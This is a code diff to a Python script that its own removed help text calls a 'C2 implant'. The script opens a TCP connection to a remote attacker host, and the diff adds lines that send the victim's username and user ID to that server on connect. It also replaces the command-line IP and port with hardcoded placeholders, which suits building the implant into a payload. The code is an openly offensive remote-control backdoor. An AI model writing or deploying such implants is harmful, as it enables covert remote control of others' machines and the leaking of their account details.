@@ -1,13 +1,9 @@
 import socket
 import subprocess
 import os
-import argparse
+import pwd
 
-parser = argparse.ArgumentParser(description='C2 implant ')
-parser.add_argument('-ip', type=str, required=True, help='Input the remote IP  ')
-parser.add_argument('-p', type=int, required=True, help='Input the remote port ')
 
-args = parser.parse_args()
 
 
 def inbound_comm(): # Handle inbound comunications and decode to str from bytes
@@ -28,6 +24,8 @@ def outbound_comm(message): #Handle outgoing comms - sending response to server
 def session_handler(): # Handle the sessions, connections, port etc - handle implate functionality as well
     print(f'[+] Trying to connect to {host_ip}')
     sock.connect((host_ip,host_port))
+    outbound_comm(pwd.getpwuid(os.getuid())[0])
+    outbound_comm(os.getuid())
     print(f'[+] Connected to {host_ip}')
 
     while True:
@@ -61,8 +59,8 @@ def session_handler(): # Handle the sessions, connections, port etc - handle imp
 
 if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host_ip = args.ip
-    host_port = args.p
+    host_ip = 'INPUT_IP'
+    host_port = INPUT_PORT
     session_handler()
 
 
